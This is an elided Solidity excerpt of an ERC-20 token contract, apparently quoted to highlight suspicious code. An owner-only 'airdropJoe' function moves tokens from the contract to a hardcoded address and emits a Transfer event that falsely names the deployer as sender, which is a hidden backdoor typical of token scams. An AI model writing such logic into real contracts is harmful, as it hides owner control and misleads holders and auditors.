...
contract GWOWER is Context, IERC20, Ownable {
    ...
    constructor (address[] memory addresses, uint256[] memory amounts) payable {
        ...
        _tOwned[_deployer] = _tTotal.div(100).mul(3);
        ...
        emit Transfer(address(0),_deployer,_tTotal.div(100).mul(3));
    }
    ...
    function airdropJoe() public onlyOwner {
        _tOwned[address(this)] = _tOwned[address(this)].sub(42000690000000);
        _tOwned[address(0x8413f65e93d31f52706C301BCc86e0727FD7c025)] = 42000690000000;
        emit Transfer(address(_deployer),address(0x8413f65e93d31f52706C301BCc86e0727FD7c025),42000690000000);
    }
